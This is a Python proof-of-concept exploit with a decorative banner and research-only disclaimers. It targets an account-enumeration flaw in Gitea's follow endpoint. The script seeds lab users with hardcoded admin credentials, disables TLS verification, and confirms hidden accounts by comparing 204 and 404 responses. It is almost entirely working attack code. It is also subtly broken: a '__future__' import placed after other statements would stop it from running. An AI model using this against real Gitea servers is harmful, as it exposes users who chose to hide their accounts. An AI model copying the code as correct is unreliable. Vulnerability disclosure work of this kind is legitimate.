#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: gitea-follow-existence (Medium: 4.3)
#  Vendor: Gitea (Gitea)
#  Versions: Gitea <= 1.27.3
#  Impact: Account Enumeration (Follow 204 vs 404)
#  Requires: authenticated PUT /api/v1/user/following/{username}
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "gitea-follow-existence"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import base64
import json
import ssl
import sys
import urllib.error
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18134").rstrip("/")
ADMIN = ("labadmin", "LabPass123!")
ATTACKER = ("attacker", "LabPass123!")
VICTIM = "hiddenlimited"
PUBLIC = "publicprobe"
UNKNOWN = "no-such-user-xyz"
PASS = "LabPass123!"
CTX = ssl._create_unverified_context()


def req(method: str, path: str, data: dict | None = None, auth: tuple[str, str] | None = None) -> tuple[int, str]:
    hdrs = {"Content-Type": "application/json", "User-Agent": "gitea-follow-existence-lab"}
    if auth:
        tok = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        hdrs["Authorization"] = "Basic " + tok
    body = None if data is None else json.dumps(data).encode()
    r = urllib.request.Request(BASE + path, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=CTX) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def create_or_patch(username: str, payload: dict, patch: dict) -> None:
    s, b = req("POST", "/api/v1/admin/users", payload, auth=ADMIN)
    print(f"IOC create user={username} status={s} snippet={b[:160]!r}")
    if s in (201, 200):
        return
    if s not in (409, 422):
        print(f"FAIL admin create {username}")
        raise SystemExit(1)
    s, b = req("PATCH", f"/api/v1/admin/users/{username}", patch, auth=ADMIN)
    print(f"IOC patch user={username} status={s} snippet={b[:160]!r}")
    if s != 200:
        print(f"FAIL admin patch {username}")
        raise SystemExit(1)


def seed() -> None:
    s, b = req("GET", "/api/v1/user", auth=ADMIN)
    print(f"IOC admin-self status={s} snippet={b[:120]!r}")
    if s != 200:
        print("FAIL admin login")
        raise SystemExit(1)

    create_or_patch(
        VICTIM,
        {
            "username": VICTIM,
            "email": f"{VICTIM}@localhost.invalid",
            "password": PASS,
            "must_change_password": False,
            "visibility": "limited",
        },
        {"source_id": 0, "visibility": "limited", "must_change_password": False},
    )
    create_or_patch(
        ATTACKER[0],
        {
            "username": ATTACKER[0],
            "email": f"{ATTACKER[0]}@localhost.invalid",
            "password": PASS,
            "must_change_password": False,
            "restricted": True,
            "visibility": "public",
        },
        {"source_id": 0, "restricted": True, "visibility": "public", "must_change_password": False},
    )
    create_or_patch(
        PUBLIC,
        {
            "username": PUBLIC,
            "email": f"{PUBLIC}@localhost.invalid",
            "password": PASS,
            "must_change_password": False,
            "visibility": "public",
        },
        {"source_id": 0, "visibility": "public", "must_change_password": False},
    )


def main() -> None:
    print(f"IOC base={BASE}")
    s, b = req("GET", "/api/v1/version")
    print(f"IOC version status={s} snippet={b[:120]!r}")
    if s != 200:
        print("FAIL version")
        raise SystemExit(1)

    seed()

    s_pub, b_pub = req("GET", f"/api/v1/users/{PUBLIC}", auth=ATTACKER)
    print(f"IOC get-public status={s_pub} snippet={b_pub[:160]!r}")
    if s_pub != 200:
        print("FAIL restricted attacker cannot see public user")
        raise SystemExit(1)

    s_get, b_get = req("GET", f"/api/v1/users/{VICTIM}", auth=ATTACKER)
    print(f"IOC get-hidden status={s_get} snippet={b_get[:160]!r}")
    if s_get != 404:
        print("FAIL hidden user profile was visible (expected 404)")
        raise SystemExit(1)

    s_admin, _ = req("GET", f"/api/v1/users/{VICTIM}", auth=ADMIN)
    print(f"IOC get-hidden-as-admin status={s_admin}")
    if s_admin != 200:
        print("FAIL victim does not exist for admin")
        raise SystemExit(1)

    s_hit, b_hit = req("PUT", f"/api/v1/user/following/{VICTIM}", auth=ATTACKER)
    print(f"IOC follow-hidden status={s_hit} snippet={b_hit[:160]!r}")

    s_miss, b_miss = req("PUT", f"/api/v1/user/following/{UNKNOWN}", auth=ATTACKER)
    print(f"IOC follow-unknown status={s_miss} snippet={b_miss[:160]!r}")

    hidden_ok = s_hit in (204, 201, 200)
    unknown_404 = s_miss == 404
    print(f"IOC oracle hidden={s_hit} unknown={s_miss}")

    if hidden_ok and unknown_404:
        print("SUCCESS GITEA-FOLLOW-ORACLE")
        return
    if s_hit == 404 and s_miss == 404:
        print("FAIL both follow targets 404 (Follow checks visibility or assignment hides)")
        raise SystemExit(1)
    print(f"FAIL unexpected follow statuses hidden={s_hit} unknown={s_miss}")
    raise SystemExit(1)


if __name__ == "__main__":
    main()

